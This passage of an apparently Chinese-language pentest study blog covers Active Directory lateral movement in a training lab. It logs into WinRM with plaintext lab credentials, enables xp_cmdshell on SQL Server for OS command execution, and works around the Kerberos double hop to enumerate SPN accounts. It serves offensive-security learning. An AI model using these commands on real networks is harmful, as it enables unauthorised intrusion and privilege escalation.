class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$password</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Klmcargo2&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="variable">$cred</span> = <span class="built_in">new-object</span> System.Management.Automation.PSCredential (<span class="string">&quot;INLANEFREIGHT\forend&quot;</span>, <span class="variable">$password</span>)</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Enter-PSSession</span> <span class="literal">-ComputerName</span> ACADEMY<span class="literal">-EA-MS01</span> <span class="literal">-Credential</span> <span class="variable">$cred</span></span><br><span class="line"></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01</span>]: <span class="built_in">PS</span> C:\Users\forend\Documents&gt; hostname</span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">[<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">MS01</span>]: <span class="built_in">PS</span> C:\Users\forend\Documents&gt; <span class="built_in">Exit-PSSession</span></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; </span><br></pre></td></tr></table></figure><h4 id="Linux-evil-winrm"><a href="#Linux-evil-winrm" class="headerlink" title="Linux - evil-winrm"></a>Linux - evil-winrm</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ evil-winrm -i 10.129.201.234 -u forend -p Klmcargo2</span><br><span class="line"># evil-winrm -i 172.16.5.5 -u forend -H NTLM</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v3.3</span><br><span class="line"></span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine</span><br><span class="line"></span><br><span class="line">Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\forend.INLANEFREIGHT\Documents&gt;</span><br></pre></td></tr></table></figure><h2 id="SQL-Server-Admin"><a href="#SQL-Server-Admin" class="headerlink" title="SQL Server Admin"></a>SQL Server Admin</h2><p> SQL 服务器上，通常会发现设置了 sysadmin 权限的用户和服务帐户。可以通过 Kerberoasting 或其他方式（例如 LLMNR&#x2F;NBT-NS Poisoning 或 Password Spraying ）获取具有此访问权限的帐户的凭据。另一种查找 SQL Server 凭据的方法是使用<a href="https://github.com/SnaffCon/Snaffler">Snaffler</a>工具查找包含 SQL Server 连接字符串的 web.config 或其他类型的配置文件。</p><h3 id="enum-6"><a href="#enum-6" class="headerlink" title="enum"></a>enum</h3><h4 id="BloodHound-2"><a href="#BloodHound-2" class="headerlink" title="BloodHound"></a>BloodHound</h4><p>BloodHound 查找<code>SQL Admin Rights</code>权限，可以在<code>Node Info</code>选项卡中检查<code>SQLAdmin</code>，或使用此自定义 Cypher 查询进行搜索：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729237968687.png" alt="sqladmins_bh"></p><h4 id="PowerUpSQL"><a href="#PowerUpSQL" class="headerlink" title="PowerUpSQL"></a>PowerUpSQL</h4><p>PowerUpSQL 枚举 MSSQL 实例，<a href="https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet">命令速查表</a>。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> .\PowerUpSQL.ps1</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-SQLInstanceDomain</span></span><br><span class="line"></span><br><span class="line">ComputerName     : ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">Instance         : ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL,<span class="number">1433</span></span><br><span class="line">DomainAccountSid : <span class="number">1500000521000170152142291832437223174127203170152400</span></span><br><span class="line">DomainAccount    : damundsen</span><br><span class="line">DomainAccountCn  : Dana Amundsen</span><br><span class="line">Service          : MSSQLSvc</span><br><span class="line">Spn              : MSSQLSvc/ACADEMY<span class="literal">-EA-DB01</span>.INLANEFREIGHT.LOCAL:<span class="number">1433</span></span><br><span class="line">LastLogon        : <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">11</span>:<span class="number">59</span> AM</span><br></pre></td></tr></table></figure><h3 id="connect-2"><a href="#connect-2" class="headerlink" title="connect"></a>connect</h3><h4 id="Windows-PowerUpSQL"><a href="#Windows-PowerUpSQL" class="headerlink" title="Windows - PowerUpSQL"></a>Windows - PowerUpSQL</h4><p>使用 PowerUpSQL Get-SQLQuery 针对远程 SQL Server 主机进行身份验证，并运行自定义查询或操作系统命令。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  <span class="built_in">Get-SQLQuery</span> <span class="literal">-Verbose</span> <span class="literal">-Instance</span> <span class="string">&quot;172.16.5.150,1433&quot;</span> <span class="literal">-username</span> <span class="string">&quot;inlanefreight\damundsen&quot;</span> <span class="literal">-password</span> <span class="string">&quot;SQL1234!&quot;</span> <span class="literal">-query</span> <span class="string">&#x27;Select @@version&#x27;</span></span><br><span class="line"></span><br><span class="line">VERBOSE: <span class="number">172.16</span>.<span class="number">5.150</span>,<span class="number">1433</span> : Connection Success.</span><br><span class="line"></span><br><span class="line">Column1</span><br><span class="line"><span class="literal">-------</span></span><br><span class="line">Microsoft SQL Server <span class="number">2017</span> (RTM) - <span class="number">14.0</span>.<span class="number">1000.169</span> (X64) ...</span><br></pre></td></tr></table></figure><h4 id="Linux-Impacket"><a href="#Linux-Impacket" class="headerlink" title="Linux - Impacket"></a>Linux - Impacket</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth</span><br><span class="line"># mssqlclient.py INLANEFREIGHT/uname:passwd@172.16.7.60</span><br><span class="line"></span><br><span class="line">Impacket v0.9.25.dev1+20220311.121550.1271d369 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed database context to &#x27;master&#x27;.</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press help for extra shell commands</span><br></pre></td></tr></table></figure><p><code>help</code>命令来查看可以使用哪些命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; help</span><br><span class="line"></span><br><span class="line">     lcd &#123;path&#125;                 - changes the current local directory to &#123;path&#125;</span><br><span class="line">     exit                       - terminates the server process (and this session)</span><br><span class="line">     enable_xp_cmdshell         - you know what it means</span><br><span class="line">     disable_xp_cmdshell        - you know what it means</span><br><span class="line">     xp_cmdshell &#123;cmd&#125;          - executes cmd using xp_cmdshell</span><br><span class="line">     sp_start_job &#123;cmd&#125;         - executes cmd using the sql server agent (blind)</span><br><span class="line">     ! &#123;cmd&#125;                    - executes a local shell cmd</span><br></pre></td></tr></table></figure><p><code>enable_xp_cmdshell</code>启用<a href="https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15">xp_cmdshell 存储过程，</a>如果相关帐户具有适当的访问权限，则该存储过程允许通过数据库执行操作系统命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; enable_xp_cmdshell</span><br><span class="line"></span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(ACADEMY-EA-DB01\SQLEXPRESS): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br></pre></td></tr></table></figure><p>最后，可以运行 <code>xp_cmdshell &lt;command&gt;</code> 格式的命令。在这里，可以枚举用户在系统上拥有的权限，并看到拥有<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege ，</a>，它可以与 <a href="https://github.com/ohpe/juicy-potato">JuicyPotato</a>、<a href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a> 或 <a href="https://github.com/antonioCoco/RoguePotato">RoguePotato</a> 等工具结合使用，以升级到 <code>SYSTEM</code> 级权限（具体取决于目标主机），并使用此访问权限继续实现目标。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell whoami /priv</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION                                                             </span><br><span class="line"></span><br><span class="line">----------------------                                                             </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">Privilege Name                Description                               State      </span><br><span class="line"></span><br><span class="line">============================= ========================================= ========   </span><br><span class="line"></span><br><span class="line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   </span><br><span class="line"></span><br><span class="line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   </span><br><span class="line"></span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    </span><br><span class="line"></span><br><span class="line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    </span><br><span class="line"></span><br><span class="line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled    </span><br><span class="line"></span><br><span class="line">SeCreateGlobalPrivilege       Create global objects                     Enabled    </span><br><span class="line"></span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   </span><br><span class="line"></span><br><span class="line">NULL                     </span><br></pre></td></tr></table></figure><hr><h1 id="Kerberos-“Double-Hop”"><a href="#Kerberos-“Double-Hop”" class="headerlink" title="Kerberos “Double Hop”"></a>Kerberos “Double Hop”</h1><p>当攻击者尝试跨两个（或更多）跳转使用 Kerberos 身份验证时，会出现一个称为“双跳”的问题。该问题涉及如何为特定资源授予 Kerberos 票证。Kerberos 票证不应被视为密码。它们是来自 KDC 的签名数据片段，用于说明帐户可以访问哪些资源。当执行 Kerberos 身份验证时，会获得允许访问所请求资源（即一台机器）的”ticket”。相反，当使用密码进行身份验证时，该 NTLM Hash会存储在会话中，并且可以在其他地方使用而不会出现问题。</p><p>简单来说，在这种情况下，当尝试发出多服务器命令时，凭据不会从第一台机器发送到第二台机器。</p><p>假设有三台主机：<code>Attack host</code>–&gt; <code>DEV01</code>–&gt; <code>DC01</code>。攻击主机是企业网络内的 Parrot 盒，但未加入域。获取了域用户的一组凭据，发现他们是<code>Remote Management Users</code>DEV01 上组的一部分。想要使用它<code>PowerView</code>来枚举域，这需要与域控制器 DC01 进行通信。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729238945350.png" alt="double_hop"></p><p>当使用<code>evil-winrm</code> 等工具连接到 <code>DEV01</code> 时，会使用网络身份验证进行连接，因此凭据不会存储在内存中，因此不会出现在系统中以代表用户对其他资源进行身份验证。当加载 <code>PowerView</code> 等工具并尝试查询 Active Directory 时，Kerberos 无法告诉 DC 用户可以访问域中的资源。发生这种情况的原因是用户的 Kerberos TGT（票证授予票证）票证未发送到远程会话；因此，用户无法证明自己的身份，并且命令将不再在此用户的上下文中运行。</p><p>换句话说，在向目标主机进行身份验证时，用户的票证授予服务 (TGS) 票证会发送到允许执行命令的远程服务，但不会发送用户的 TGT 票证。当用户尝试访问域中的后续资源时，他们的 TGT 将不会出现在请求中，因此远程服务将无法证明身份验证尝试是有效的，并且将被拒绝访问远程服务。</p><h2 id="Workarounds"><a href="#Workarounds" class="headerlink" title="Workarounds"></a>Workarounds</h2><p><a href="https://posts.slayerlabs.com/double-hop/">这篇文章</a>介绍了一些解决双跳问题的方法。使用“嵌套”<code>Invoke-Command</code>在每次请求中发送凭据（在创建 PSCredential 对象之后），因此如果尝试从攻击主机向主机 A 进行身份验证并在主机 B 上运行命令，将获得许可。</p><p>使用域凭据连接到远程主机后，导入 PowerView，然后尝试运行命令。如下所示，收到错误，因为无法将身份验证传递给域控制器来查询 SPN 帐户。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">import-module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span></span><br><span class="line">Exception calling <span class="string">&quot;FindAll&quot;</span> with <span class="string">&quot;0&quot;</span> argument(s): <span class="string">&quot;An operations error occurred.</span></span><br><span class="line"><span class="string">&quot;</span></span><br><span class="line">At C:\Users\backupadm\Documents\PowerView.ps1:<span class="number">5253</span> char:<span class="number">20</span></span><br><span class="line">+             <span class="keyword">else</span> &#123; <span class="variable">$Results</span> = <span class="variable">$UserSearcher</span>.FindAll() &#125;</span><br><span class="line">+                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException</span><br><span class="line">    + FullyQualifiedErrorId : DirectoryServicesCOMException</span><br></pre></td></tr></table></figure><p>检查<code>klist</code>，会发现只有一个当前服务器的缓存 Kerberos 票证。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x57f8a</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt; Client: backupadm @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">    Server: academy<span class="literal">-aen-ms0</span><span class="variable">$</span> <span class="selector-tag">@</span></span><br><span class="line">    KerbTicket Encryption <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">    Ticket Flags <span class="number">0</span>xa10000 -&gt; renewable pre_authent name_canonicalize</span><br><span class="line">    <span class="built_in">Start</span> Time: <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">31</span>:<span class="number">53</span> (local)</span><br><span class="line">    <span class="keyword">End</span> Time:   <span class="number">6</span>/<span class="number">28</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">46</span>:<span class="number">53</span> (local)</span><br><span class="line">    Renew Time: <span class="number">7</span>/<span class="number">5</span>/<span class="number">2022</span> <span class="number">7</span>:<span class="number">31</span>:<span class="number">18</span> (local)</span><br><span class="line">    Session Key <span class="built_in">Type</span>: AES<span class="literal">-256-CTS-HMAC-SHA1-96</span></span><br><span class="line">    Cache Flags: <span class="number">0</span>x4 -&gt; S4U</span><br><span class="line">    Kdc Called: DC01.INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure><h3 id="Workaround-1-PSCredential-Object"><a href="#Workaround-1-PSCredential-Object" class="headerlink" title="Workaround #1: PSCredential Object"></a>Workaround #1: PSCredential Object</h3><p>通过主机 A 连接到远程主机，并设置 PSCredential 对象以再次传递凭据。</p><p>首先，设置身份验证。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;!qazXSW@&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line"></span><br><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt;  <span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;INLANEFREIGHT\backupadm&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br></pre></td></tr></table></figure><p>现在可以尝试使用 PowerView 查询 SPN 帐户，因为将凭据与命令一起传递了。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">*Evil<span class="literal">-WinRM</span>* <span class="built_in">PS</span> C:\Users\backupadm\Documents&gt; <span class="built_in">get-domainuser</span> <span class="literal">-spn</span> <span class="literal">-credential</span> <span class="variable">$Cred</span> | <span class="built_in">select</span> samaccountname</span><br><span class="line"></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line">|S<span class="literal">-chain</span>|-&lt;&gt;<span class="literal">-127</span>.<span class="number">0.0</span>.<span class="number">1</span>:<span class="number">9051</span>-&lt;&gt;&lt;&gt;<span class="literal">-172</span>.<span class="number">16.8</span>.<span class="number">50</span>:<span class="number">5985</span>-&lt;&gt;&lt;&gt;<span class="literal">-OK</span></span><br><span class="line"></span><br><span class="line">samaccountname</span><br><span class="line"><span class="literal">--------------</span></span><br><span class="line">azureconnect</span><br><span class="line">backupjob</span><br><span class="line">krbtgt</span><br><span class="line">mssqlsvc</span><br><span class="line">sqltest</span><br><span class="line">sqlqa</span><br><span class="line">sqldev</span><br><span class="line">mssqladm</span><br><span class="line">svc_sql</span><br><span class="line">sqlprod</span><br><span class="line">sapsso</span><br><span class="line">sapvc</span><br><span class="line">vmwarescvc</span><br></pre></td></tr></table></figure><p>如果通过 RDP 连接到同一台主机，打开 CMD 提示符并输入<code>klist</code>，将看到已缓存必要的票证，可以直接与域控制器交互，并且不必再担心双跳问题，因为密码已存储在内存中，因此它可以与发出的每个请求一起发送。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">klist</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Current</span> <span class="title">LogonId</span> <span class="title">is</span> 0:0<span class="title">x1e5b8b</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Cached</span> <span class="title">Tickets</span>: (4)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#0&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">krbtgt</span>/<span class="title">INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x60a10000</span> -&gt; <span class="title">forwardable</span> <span class="title">forwarded</span> <span class="title">renewable</span> <span class="title">pre_authent</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0<span class="title">x2</span> -&gt; <span class="title">DELEGATION</span></span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#1&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">krbtgt</span>/<span class="title">INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Ticket</span> <span class="title">Flags</span> 0<span class="title">x40e10000</span> -&gt; <span class="title">forwardable</span> <span class="title">renewable</span> <span class="title">initial</span> <span class="title">pre_authent</span> <span class="title">name_canonicalize</span></span></span><br><span class="line"><span class="function">        <span class="title">Start</span> <span class="title">Time</span>: 6/28/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">End</span> <span class="title">Time</span>:   6/28/2022 19:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Renew</span> <span class="title">Time</span>: 7/5/2022 9:13:38 (<span class="title">local</span>)</span></span><br><span class="line"><span class="function">        <span class="title">Session</span> <span class="title">Key</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">        <span class="title">Cache</span> <span class="title">Flags</span>: 0<span class="title">x1</span> -&gt; <span class="title">PRIMARY</span></span></span><br><span class="line"><span class="function">        <span class="title">Kdc</span> <span class="title">Called</span>: <span class="title">DC01.INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#2&gt;     <span class="title">Client</span>: <span class="title">backupadm</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">Server</span>: <span class="title">ProtectedStorage</span>/<span class="title">DC01.INLANEFREIGHT.LOCAL</span> @ <span class="title">INLANEFREIGHT.LOCAL</span></span></span><br><span class="line"><span class="function">        <span class="title">KerbTicket</span> <span class="title">Encryption</span> <span class="title">Type</span>: <span class="title">AES</span>-256-<span class="title">CTS</span>-<span class="title">HMAC</span>-<span class="title">SHA1</span>-96</span></span><br><span class="line"><span class="function">      